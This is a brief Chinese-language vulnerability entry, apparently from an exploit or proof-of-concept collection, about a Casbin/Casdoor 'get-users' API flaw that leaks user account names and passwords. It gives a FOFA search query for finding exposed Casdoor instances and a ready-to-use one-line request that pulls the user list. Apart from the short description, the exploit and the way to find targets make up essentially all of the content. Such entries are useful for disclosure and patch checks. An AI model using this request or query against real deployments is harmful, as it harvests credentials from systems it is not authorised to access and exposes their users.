# Casbin get-users 账号密码泄漏漏洞

## 漏洞描述

Casbin get-users api接口存在账号密码泄漏漏洞，攻击者通过漏洞可以获取用户敏感信息

## 漏洞影响

```
Casbin
```

## FOFA

```
title="Casdoor"
```

## 漏洞复现

登录页面

![image-20220524143206718](./images/202205241432780.png)

验证POC

```
/api/get-users?p=123&pageSize=123
```

![image-20220524143215583](./images/202205241432624.png)